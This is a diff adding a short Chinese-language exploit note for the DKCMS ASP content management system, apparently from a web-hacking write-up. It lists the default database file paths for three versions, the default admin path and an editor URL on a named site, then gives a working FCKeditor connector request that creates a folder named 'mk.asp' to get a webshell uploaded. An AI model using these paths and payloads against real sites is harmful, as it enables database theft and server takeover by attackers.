@@ -1,0 +1,23 @@
+漏洞类型：上传漏洞
+
+看了下，主要是差不多3个版本为主吧，v2.0 v3.1 v4.2
+
+官网竟然找不到源码下载，就百度了，下载了这3款源码，因为是asp的源码，大多都是看看默认数据库，一下是三款默认数据库
+
+V2.0 data/dkcm_ssdfhwejkfs.mdb
+
+V3.1 _data/___dkcms_30_free.mdb
+
+V4.2 _data/I^(()UU()H.mdb
+
+默认后台：admin
+
+编辑器：http://www.yunsec.net/admin/fckeditor
+
+这些都是，由此可见，官方安全意识挺差的，至于后台拿shell，fck编辑器突破可拿shell
+
+建立asp文件夹
+
+Fck的路径：
+
+Admin/FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&Type=Image&CurrentFolder=/mk.asp&NewFolderName=mk.asp
